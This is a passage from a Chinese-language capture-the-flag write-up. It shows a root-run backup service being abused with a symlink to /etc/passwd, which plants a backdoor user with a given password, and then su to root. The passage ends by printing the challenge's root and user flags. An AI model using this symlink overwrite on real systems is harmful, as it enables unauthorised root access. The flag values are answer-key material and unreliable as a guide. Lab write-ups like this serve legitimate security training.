+bamuwe@Maze:~/a$ cat /etc/log_backup_service/config.json
+{
+  "source_log_path": "/tmp/passwd",
+  "backup_dest": "/home/bamuwe/a/",
+  "run_as_user": "root"
+}
+bamuwe@Maze:~/a$ ln -sf /etc/passwd passwd.20250904080149.bak
+```
+
+当服务运行时，会将恶意的passwd文件内容写入到`/etc/passwd`，从而创建后门用户。
+
+### 4. 切换到root权限
+
+直接登录b就好了，密码`abcdefg`
+
+```bash
+bamuwe@Maze:~/a$ su b
+Password: 
+root@Maze:/home/bamuwe/a# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+# 六、获取Flag
+
+```bash
+root@Maze:/home/bamuwe/a# cat /root/root.txt /srv/tftp/user.txt
+flag{root-6195bd8a9d755a41e493440a804f46d4}
+flag{user-4e79af9d9b43464228ae1100839a2575}
+username:bamuwe
+need:bruteforce
+```
